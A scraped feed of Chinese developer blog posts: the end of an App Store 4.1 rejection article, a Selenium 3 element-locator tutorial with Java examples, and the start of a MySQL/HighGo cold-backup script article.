Learn more about guideline <span class="hljs-number">4.1</span>. Visit Preventing Copycat <span class="hljs-built_in">and</span> Impersonation Rejections <span class="hljs-keyword">to</span> learn best practices that will help you submit apps that follow this guideline.

Support
- Reply <span class="hljs-keyword">to</span> this message <span class="hljs-keyword">in</span> your preferred language <span class="hljs-keyword">if</span> you need assistance. <span class="hljs-keyword">If</span> you need additional support, use the Contact Us <span class="hljs-keyword">module</span>.
- Consult <span class="hljs-keyword">with</span> fellow developers <span class="hljs-built_in">and</span> Apple engineers <span class="hljs-keyword">on</span> the Apple Developer Forums.
- Provide feedback <span class="hljs-keyword">on</span> this message <span class="hljs-built_in">and</span> your review experience <span class="hljs-keyword">by</span> completing a <span class="hljs-type">short</span> survey.
</code></pre>
<p><strong>原文分析</strong></p>
<p>对于AppStore来说，<code>'死了么'</code>这种产品已经成为了流行词 + 品牌词。AppStore一贯的风格就是，<code>保护先吃螃蟹的人</code>。</p>
<p>所以客观来说，不管是<strong>4.3a</strong> 还是 <strong>4.1</strong>，底层逻辑都是对于AppStore环境的净化。</p>
<h3 data-id="heading-1">杜绝“误导性关联”</h3>
<p>App Store 4.1条款并非禁止所有第三方内容引用，核心是打击无合法授权的“仿冒式关联”，杜绝侵占他人知识产权、误导用户判断的行为。只要元数据或产品形态易关联热门品牌，即可能被拒此类违规。</p>
<h3 data-id="heading-2">拒绝“侥幸蹭流”</h3>
<p>这种蹭流量类型的产品，<code>本质上要么是付费收割，要么是广告变现</code>。同时，也是最有可能染指3.2f类型的产品。</p>
<p>在这种背景下，是极易容易被苹果判定为相同类型的团队，在复刻被封号下架的产品。</p>
<p><code>遵守规则，方得长治久安</code>，最后祝大家大吉大利，今晚过审！</p>
<h3 data-id="heading-3">相关推荐</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># 苹果开发者续费大坑及成功续费方案！亲测有效</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStore敏感词排查手册，多维度分析Guideline 2.3.1隐藏功能，轻松过审。</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FV2F4BaEYh5HfeUUHm1tI6Q" target="_blank" title="https://mp.weixin.qq.com/s/V2F4BaEYh5HfeUUHm1tI6Q" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（代码篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FLs3su8fmMckTocPwMmFaNQ" target="_blank" title="https://mp.weixin.qq.com/s/Ls3su8fmMckTocPwMmFaNQ" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（ASO篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果加急审核是“绿色通道”还是“死亡陷阱”？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果开发者邮箱，突然收到11.2通知严重么？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 不想被苹果卡审最好错开这两个提审时间</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 手撕苹果审核4.3是代码问题还是设计问题？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 有幸和Appstore审核人员进行了一场视频会议特此记录。</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Selenium3+Pytest+Allure落地Python Web自动化测试（15章已完结）]]></title>    <link>https://juejin.cn/post/7597024900522016820</link>    <guid>https://juejin.cn/post/7597024900522016820</guid>    <pubDate>2026-01-20T10:18:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597024900522016820" data-draft-id="7597270795211669544" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Selenium3+Pytest+Allure落地Python Web自动化测试（15章已完结）"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T10:18:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户01883123795"/> <meta itemprop="url" content="https://juejin.cn/user/2420462317479864"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Selenium3+Pytest+Allure落地Python Web自动化测试（15章已完结）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2420462317479864/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户01883123795
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:18:55.000Z" title="Tue Jan 20 2026 10:18:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Selenium3+Pytest+Allure落地Python Web自动化测试---xingkeit.top/7734/</strong></p>
<h2 data-id="heading-0">Selenium3 的定位能力优势：轻松应对复杂页面</h2>
<p>在现代 Web 自动化测试中，面对日益复杂的页面结构——无论是嵌套多层的动态 Div、动态生成的表格，还是深不见底的 Shadow DOM（影子 DOM）——精准找到页面元素往往是测试工程师最大的痛点。</p>
<p>Selenium 3 之所以久经不衰，核心优势之一就在于它提供了<strong>极其丰富且灵活的元素定位策略</strong>。它不仅支持基础的 ID 和 XPath，更引入了强大的 CSS 选择器和层级定位逻辑，能像手术刀一样精准剖析复杂页面。</p>
<h3 data-id="heading-1">一、 应对动态属性：灵活的 CSS 与 XPath</h3>
<p>在单页应用（SPA）中，元素的 <code>id</code> 或 <code>class</code> 往往是动态生成的（如 <code>class="btn-3f9a12"</code>），直接硬编码必然失败。Selenium 3 的优势在于你可以利用<strong>部分匹配</strong>和<strong>层级关系</strong>来锁定元素。</p>
<h4 data-id="heading-2">场景：忽略动态类名，定位特定按钮</h4>
<p>假设页面中有多个按钮，但我们只想点击“提交”按钮，且它的 class 包含动态哈希值。</p>
<p>java</p>
<p>复制</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.openqa.selenium.By;
<span class="hljs-keyword">import</span> org.openqa.selenium.WebDriver;
<span class="hljs-keyword">import</span> org.openqa.selenium.WebElement;
<span class="hljs-keyword">import</span> org.openqa.selenium.chrome.ChromeDriver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicLocatorDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">WebDriver</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChromeDriver</span>();
        driver.get(<span class="hljs-string">"https://example.com/form"</span>) ;

        <span class="hljs-comment">// 策略 1：使用 CSS 包含匹配 (^= 表示以...开头，*= 表示包含)</span>
        <span class="hljs-comment">// 即使 class 变成了 "btn-submit-x7k9L"，也能定位到</span>
        <span class="hljs-type">WebElement</span> <span class="hljs-variable">submitBtn</span> <span class="hljs-operator">=</span> driver.findElement(
            By.cssSelector(<span class="hljs-string">"button[class^='btn-submit']"</span>)
        );
        submitBtn.click();

        <span class="hljs-comment">// 策略 2：使用 XPath 的文本定位，完全无视样式和 ID</span>
        <span class="hljs-comment">// 这是一个极其强大的“容错”手段，只要页面文案不变，代码就不会崩</span>
        <span class="hljs-type">WebElement</span> <span class="hljs-variable">loginBtn</span> <span class="hljs-operator">=</span> driver.findElement(
            By.xpath(<span class="hljs-string">"//button[contains(text(), '登 录')]"</span>)
        );
        loginBtn.click();
        
        driver.quit();
    }
}
</code></pre>
<h3 data-id="heading-3">二、 应对复杂表格：轴定位的降维打击</h3>
<p>这是 Selenium 3 相比 Playwright 等新工具最具“极客范儿”的优势。在处理复杂的嵌套表格时，单纯靠索引定位非常脆弱。利用 XPath 的<strong>轴定位</strong>，我们可以基于“已知元素”找到“未知元素”。</p>
<h4 data-id="heading-4">场景：找到“用户名”所在行，点击该行的“编辑”按钮</h4>
<p>如果表格结构是：<br/>
<code>&lt;tr&gt;&lt;td&gt;张三&lt;/td&gt;&lt;td&gt;&lt;input type='button' value='编辑'&gt;&lt;/td&gt;&lt;/tr&gt;</code></p>
<p>我们只知道用户叫“张三”，不知道他在第几行。</p>
<p>java</p>
<p>复制</p>
<pre><code class="hljs language-ini" lang="ini">public class ComplexTableDemo {
    public static void main(String<span class="hljs-section">[]</span> args) {
        WebDriver <span class="hljs-attr">driver</span> = new ChromeDriver()<span class="hljs-comment">;</span>
        driver.get("https://example.com/user-table") <span class="hljs-comment">;</span>

        // 1. 先找到包含文本 "张三" 的单元格
        // 2. 利用 parent:: 获取其父节点 (tr)
        // 3. 利用 descendant-or-self:: 找到该行内的编辑按钮
        
        String <span class="hljs-attr">xpathQuery</span> = <span class="hljs-string">"//td[contains(text(), '张三')]/parent::tr//input[@value='编辑']"</span><span class="hljs-comment">;</span>
        
        WebElement <span class="hljs-attr">editButton</span> = driver.findElement(By.xpath(xpathQuery))<span class="hljs-comment">;</span>
        
        // 或者更复杂的轴定位逻辑：
        // 找到张三的单元格 -&gt; 找到它的父级行 -&gt; 找到该行下的第 3 个单元格
        String <span class="hljs-attr">advancedQuery</span> = <span class="hljs-string">"//td[text()='张三']/parent::tr/td[3]/a"</span><span class="hljs-comment">;</span>
        
        WebElement <span class="hljs-attr">detailLink</span> = driver.findElement(By.xpath(advancedQuery))<span class="hljs-comment">;</span>
        detailLink.click()<span class="hljs-comment">;</span>
        
        driver.quit()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-5">三、 应对层级结构：父子级与兄弟级联查找</h3>
<p>现代页面往往嵌套极深，直接写一个长长的 <code>div/div/div/ul/li/a</code> 不仅难看，而且一旦父级结构微调就会失效。Selenium 3 允许我们先定位父容器，再在父容器内进行子查找，既提高了可读性，又提高了性能。</p>
<h4 data-id="heading-6">场景：多级菜单操作</h4>
<p>java</p>
<p>复制</p>
<pre><code class="hljs language-ini" lang="ini">public class HierarchicalSearchDemo {
    public static void main(String<span class="hljs-section">[]</span> args) {
        WebDriver <span class="hljs-attr">driver</span> = new ChromeDriver()<span class="hljs-comment">;</span>
        driver.get("https://example.com/dashboard") <span class="hljs-comment">;</span>

        // 第一步：先定位到侧边栏菜单（父容器）
        // 这样可以减少全局搜索范围
        WebElement <span class="hljs-attr">sidebar</span> = driver.findElement(By.id(<span class="hljs-string">"sidebar-menu"</span>))<span class="hljs-comment">;</span>

        // 第二步：在父容器内查找子元素（子级查找）
        // 这里的查找范围被限制在了 sidebar 内部，不会误触 Header 里的同名元素
        WebElement <span class="hljs-attr">systemMenu</span> = sidebar.findElement(By.linkText(<span class="hljs-string">"系统管理"</span>))<span class="hljs-comment">;</span>

        // 鼠标悬停触发下拉
        Actions <span class="hljs-attr">actions</span> = new Actions(driver)<span class="hljs-comment">;</span>
        actions.moveToElement(systemMenu).perform()<span class="hljs-comment">;</span>

        // 第三步：查找兄弟级元素（下拉菜单）
        // 在 systemMenu 的父级下，查找显示出来的子菜单
        WebElement <span class="hljs-attr">userManage</span> = driver.findElement(
            By.xpath("//a<span class="hljs-section">[contains(text(), '系统管理')]</span>/following-sibling::ul//a<span class="hljs-section">[text()='用户管理']</span>")
        )<span class="hljs-comment">;</span>
        
        userManage.click()<span class="hljs-comment">;</span>
        
        driver.quit()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-7">四、 总结</h3>
<p>Selenium 3 的定位能力之所以强大，不仅仅是因为它支持 8 种基础定位策略，更在于它支持这些策略的<strong>组合使用</strong>。</p>
<ul>
<li><strong>CSS Selector</strong> 适合处理样式相关的、动态 Class 的场景，语法简洁。</li>
<li><strong>XPath</strong> 是处理复杂逻辑、文本匹配、层级结构的终极武器，特别是它的<strong>轴定位</strong>功能，几乎能应对任何变态的 DOM 结构。</li>
</ul>
<p>在面试或实际工作中，当自动化脚本因为“找不到元素”而失败时，往往是开发者没有充分利用 Selenium 3 提供的这些高级定位能力。掌握它们，你就能轻松应对任何复杂的 Web 页面。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL/瀚高双机冷备Shell脚本（支持docker容器）]]></title>    <link>https://juejin.cn/post/7596991930985938995</link>    <guid>https://juejin.cn/post/7596991930985938995</guid>    <pubDate>2026-01-20T10:22:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596991930985938995" data-draft-id="7597125475601481755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL/瀚高双机冷备Shell脚本（支持docker容器）"/> <meta itemprop="keywords" content="后端,数据库"/> <meta itemprop="datePublished" content="2026-01-20T10:22:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="roc98"/> <meta itemprop="url" content="https://juejin.cn/user/677759452188541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL/瀚高双机冷备Shell脚本（支持docker容器）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/677759452188541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    roc98
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:22:03.000Z" title="Tue Jan 20 2026 10:22:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本篇为历史文档的升级版本，支持瀚高，支持动态配置信息，傻瓜式使用。本文撰写大量参考AI给出的建议。</p>
<p>本文脚本放在最后，如果您想直接阅读脚本，请直接翻阅至最后。</p>
<p><a href="https://juejin.cn/post/7121955767866884104" target="_blank" title="https://juejin.cn/post/7121955767866884104">shell脚本实现mysql数据库双机定时备份</a></p>
</blockquote>
<h2 data-id="heading-0">1. 方案概述</h2>
<p>本套脚本旨在为 <strong>MySQL</strong> 和 <strong>HighGo (瀚高)</strong> 数据库提供简单、低成本的<strong>全量冷备</strong>方案。支持物理机直接部署和 <strong>Docker 容器化</strong>部署，并可灵活选择<strong>单机本地备份</strong>或<strong>双机异地容灾</strong>。</p>
<h3 data-id="heading-1">1.1 核心流程图</h3>
<pre><code class="hljs language-scss" lang="scss"> +----------------+                          +----------------+
 |  主服务器 (A)   |                          |  从服务器 (B)   |
 | (Script: Master)|                          | (Script: Slave)|
 +--------+-------+                          +--------+-------+
          |                                           |
     <span class="hljs-number">1</span>. 导出数据 (mysqldump/pg_dump)                  |
          |                                           |
     <span class="hljs-number">2</span>. 流式压缩 (.sql.gz)                            |
          |                                           |
     <span class="hljs-number">3</span>. 传输文件 (SSH/SCP) <span class="hljs-selector-attr">[可选步骤]</span> -----------&gt;  <span class="hljs-number">4</span>. 接收文件
     (若配置了 SLAVE_IP 则传输，否则跳过)                |
          |                                           |
